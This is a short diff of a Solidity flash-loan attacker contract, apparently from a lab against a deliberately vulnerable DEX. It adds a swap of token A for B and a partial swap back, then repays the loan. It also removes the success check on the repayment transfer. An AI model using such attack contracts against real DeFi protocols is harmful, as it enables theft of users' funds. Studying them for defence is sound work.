@@ -56,18 +56,18 @@ contract FlashLoanAttacker {
         tokenA.approve(dex, type(uint256).max);
         tokenB.approve(dex, type(uint256).max);
 
-        IVulnerableDEX(dex).swapAForB(amount);
+        uint256 bReceived = IVulnerableDEX(dex).swapAForB(amount);
+
+        uint256 aRecovered = IVulnerableDEX(dex).swapBForA(bReceived / 2);
 
         require(
             tokenA.balanceOf(address(this)) >= amount,
             "still not enough A to repay"
         );
 
-        require(
-            tokenA.transfer(address(flashLoanProvider), amount),
-            "repay failed"
-        );
+        tokenA.transfer(address(flashLoanProvider), amount);
     }
+
 
 
     function withdraw() external {
